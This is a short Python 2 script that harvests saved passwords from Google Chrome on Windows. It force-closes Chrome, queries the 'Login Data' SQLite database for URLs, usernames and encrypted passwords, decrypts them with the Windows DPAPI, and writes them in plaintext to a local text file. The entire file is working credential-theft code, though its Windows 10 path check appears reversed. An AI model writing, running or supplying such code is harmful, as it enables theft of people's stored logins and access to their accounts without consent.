__author__ = 'KitaScript'

import os
import sqlite3
import win32crypt
import sys
from platform import platform

#get system type
platform_type = platform()
#print some message
print 'Version: %s' % (platform_type)

is_Win_10 = True
if platform_type.find('Windows-10') == -1:
    is_Win_10 = False

#gen way to file("Login Data" data base)
if is_Win_10 == True: 
    path = os.path.expandvars('C:\\Documents and Settings\\%USERNAME%\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Login Data')
else:
    path = os.path.expandvars('C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')

#close the Chrome
os.system('taskkill /f /im '+ 'chrome.exe')

#open file for write
source_stream = sys.stdout #need for return in origin consist

sys.stdout = open('passwords_' + platform_type + '.txt', "w+") #!!!!

#connect to db with help sqlite3
try:
	print '[+] Opening ' + path
	conn = sqlite3.connect(path)
	cursor = conn.cursor()
except Exception, e:
	print '[-] %s' % (e) 
	sys.exit(1)

#extract the url, name, login from db 
try:
	cursor.execute('SELECT action_url, username_value, password_value FROM logins')
except Exception, e:
	print '[-] %s' % (e)
	sys.exit(1)

data = cursor.fetchall()

if len(data) > 0:
    for result in data:
        try:
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        except Exception, e:
            print '[-] %s' % (e)
            pass
        if password:
            try:
                print '''[+] URL:      %s
                             LOGIN:    %s
                             PASSWORD: %s''' %(result[0], result[1], password)
            except UnicodeError, e:
                print '[-] %s' % (e)
                pass
else:
	print '[-] No results returned from query'
	sys.exit(0)

#close stdin('file')
#is't not important
sys.stdout.close()
sys.stdout = source_stream 
